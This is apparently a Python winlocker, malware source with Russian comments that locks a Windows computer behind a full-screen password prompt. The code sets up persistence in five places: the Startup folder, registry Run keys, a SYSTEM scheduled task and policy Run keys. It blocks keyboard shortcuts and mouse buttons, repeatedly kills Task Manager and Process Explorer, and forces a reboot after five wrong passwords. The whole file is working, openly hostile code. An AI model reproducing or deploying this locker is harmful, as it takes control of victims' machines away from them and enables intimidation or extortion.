import tkinter as tk
import random
import threading
import time
import os
import sys
import shutil
import subprocess
import ctypes
from datetime import datetime

# ========== НАСТРОЙКИ ==========
PASSWORD = "12345GOG"
attempts = 0
MAX_ATTEMPTS = 5  # Меньше попыток - злее!
start_time = datetime.now()
blocked_processes = []
# ================================

# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== ПРОДВИНУТАЯ АВТОЗАГРУЗКА ==========

def add_to_startup_advanced():
    """Добавляет программу в 5 мест (чтобы точно не удалили)"""
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # 1. Папка Startup
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
        dest_path = os.path.join(startup_folder, "winlocker.exe")
        shutil.copy2(current_file, dest_path)
        
        # 2. Реестр текущего пользователя
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f', shell=True)
        
        # 3. Реестр всех пользователей (если есть права)
        if is_admin():
            subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f', shell=True)
        
        # 4. Планировщик задач
        subprocess.run(f'schtasks /create /tn "WinLockerUpdate" /tr "{dest_path}" /sc onlogon /ru "SYSTEM" /f /rl HIGHEST', shell=True)
        
        # 5. Политика запуска (для опытных)
        policies = [
            f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f',
            f'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f'
        ]
        for policy in policies:
            try: subprocess.run(policy, shell=True)
            except: pass
    except:
        pass

# ========== АГРЕССИВНАЯ БЛОКИРОВКА ==========

def aggressive_block():
    """Блокирует вообще всё, что можно"""
    try:
        import keyboard
        import mouse
        
        # Блокируем системные клавиши
        system_keys = ['alt', 'ctrl', 'shift', 'windows', 'delete', 'escape', 'tab',
                       'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
                       'up', 'down', 'left', 'right', 'home', 'end', 'page_up', 'page_down',
                       'insert', 'print_screen', 'scroll_lock', 'pause', 'menu']
        
        for key in system_keys:
            try: keyboard.block_key(key)
            except: pass
        
        # Блокируем все опасные комбинации
        hotkeys = [
            'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'ctrl+esc',
            'alt+tab', 'windows+r', 'windows+e', 'windows+d',
            'alt+space', 'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z',
            'ctrl+a', 'ctrl+s', 'ctrl+o', 'ctrl+p', 'ctrl+w',
            'ctrl+shift+esc', 'alt+enter', 'shift+f10'
        ]
        
        for hotkey in hotkeys:
            try: keyboard.add_hotkey(hotkey, lambda: None)
            except: pass
        
        # Блокируем мышь (левую и правую кнопки)
        try:
            mouse.block(button='left')
            mouse.block(button='right')
        except: pass
        
    except ImportError:
        pass

# ========== СЛЕЖКА ЗА ПРОЦЕССАМИ ==========

def watch_processes():
    """Следит за попытками убить программу"""
    while True:
        try:
            import psutil
            current_pid = os.getpid()
            
            # Ищем диспетчер задач и другие опасные процессы
            dangerous = ['taskmgr.exe', 'procexp.exe', 'processhacker.exe']
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() in dangerous:
                    if proc.info['pid'] != current_pid:
                        try:
                            proc.kill()  # Убиваем диспетчер задач
                        except:
                            pass
        except:
            pass
        time.sleep(1)

# ========== УЛУЧШЕННЫЙ ИНТЕРФЕЙС ==========

def draw_ultimate_ui():
    canvas.delete("all")
    
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()
    cx = width // 2
    cy = height // 2
    
    # Падающий код (как в Матрице)
    for i in range(100):
        x = random.randint(0, width)
        y = random.randint(0, height)
        chars = random.choice(['01', 'アイウエオ', '0x7F', '0x1F'])
        canvas.create_text(x, y, text=random.choice(chars), 
                          fill='#0a3a0a', font=("Courier", random.randint(8, 16)))
    
    # Рамка с двойной обводкой
    canvas.create_rectangle(cx-320, cy-170, cx+320, cy+220, 
                          outline='#00ff00', width=5, fill='#001100')
    canvas.create_rectangle(cx-315, cy-165, cx+315, cy+215, 
                          outline='#003300', width=2, fill='')
    
    # Анимированный заголовок
    colors = ['#00ff00', '#33ff33', '#66ff66']
    canvas.create_text(cx, cy-120, text="⚠️ SYSTEM LOCKED ⚠️", 
                      fill=random.choice(colors), 
                      font=("Courier", 32, "bold"))
    
    # Время блокировки
    elapsed = datetime.now() - start_time
    canvas.create_text(cx-250, cy-150, text=f"⏱️ {elapsed.seconds}s", 
                      fill='#00ff00', font=("Courier", 10))
    
    # Череп из символов
    skull = [
        "     .-.-.     ",
        "    |  @  |    ",
        "    |  _  |    ",
        "    '-----'    "
    ]
    y_offset = cy - 50
    for line in skull:
        canvas.create_text(cx, y_offset, text=line, 
                          fill='#00ff00', font=("Courier", 12))
        y_offset += 20
    
    # Счетчик с предупреждением
    canvas.create_text(cx, cy+30, text=f"ATTEMPTS: {attempts}/{MAX_ATTEMPTS}", 
                      fill='#00ff00', font=("Courier", 18, "bold"))
    
    canvas.create_text(cx, cy+70, text="ENTER PASSWORD:", 
                      fill='#00ff00', font=("Courier", 16))
    
    canvas.create_text(cx, cy+150, text="⚠️ DO NOT TRY TO CLOSE ⚠️", 
                      fill='red', font=("Courier", 10))

# ========== ЭКРАН АДА ==========

def show_hell_screen():
    """Самый страшный экран"""
    canvas.delete("all")
    canvas.configure(bg='black')
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    # Красный череп
    skull = [
        "      ______      ",
        "   .-'      '-.   ",
        "  /   ♥    ♥   \\  ",
        " :            :",
        " |            |",
        " : ',      ,' :",
        "  \\  '----'  /  ",
        "   '.      .'   ",
        "     '----'     "
    ]
    
    y_offset = cy - 150
    for line in skull:
        canvas.create_text(cx, y_offset, text=line, 
                          fill='red', font=("Courier", 12))
        y_offset += 20
    
    canvas.create_text(cx, cy, text="☠️ SYSTEM TERMINATED ☠️", 
                      fill='red', font=("Courier", 40, "bold"))
    
    canvas.create_text(cx, cy+80, text="TOO MANY FAILED ATTEMPTS", 
                      fill='red', font=("Courier", 30))
    
    canvas.create_text(cx, cy+140, text="YOUR COMPUTER WILL RESTART IN 10 SECONDS", 
                      fill='yellow', font=("Courier", 20))
    
    canvas.create_text(cx, cy+200, text="THIS IS NOT A JOKE", 
                      fill='white', font=("Courier", 16))
    
    entry.place_forget()
    error_label.place_forget()
    
    # Обратный отсчет
    for i in range(10, 0, -1):
        canvas.create_text(cx+300, cy+140, text=str(i), 
                          fill='red', font=("Courier", 30, "bold"))
        root.update()
        time.sleep(1)
        canvas.delete("count")
    
    # Принудительная перезагрузка
    try:
        subprocess.run('shutdown /r /t 0 /f', shell=True)
    except:
        pass

# ========== ОСНОВНОЙ КОД ==========

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.overrideredirect(True)

canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                  height=root.winfo_screenheight(), 
                  bg='black', highlightthickness=0)
canvas.pack()

# Элементы ввода
entry = tk.Entry(root, font=("Courier", 20), show="*", 
                width=15, justify='center', bg='black', fg='#00ff00', 
                insertbackground='#00ff00')
entry.place(relx=0.5, rely=0.65, anchor='center')
entry.focus()

error_label = tk.Label(root, text="", font=("Courier", 14), 
                      fg='#00ff00', bg='black')
error_label.place(relx=0.5, rely=0.75, anchor='center')

# Проверка пароля
def check_password(event=None):
    global attempts
    
    if entry.get() == PASSWORD:
        root.destroy()
        sys.exit()
    else:
        attempts += 1
        error_label.config(text=f"❌ ACCESS DENIED! {attempts}/{MAX_ATTEMPTS}")
        entry.delete(0, tk.END)
        draw_ultimate_ui()
        
        if attempts >= MAX_ATTEMPTS:
            show_hell_screen()

# ЗАПУСК ВСЕХ МЕХАНИЗМОВ
draw_ultimate_ui()
add_to_startup_advanced()

# Запускаем блокировки в фоне
threading.Thread(target=aggressive_block, daemon=True).start()
threading.Thread(target=watch_processes, daemon=True).start()

root.bind('<Return>', check_password)
root.mainloop()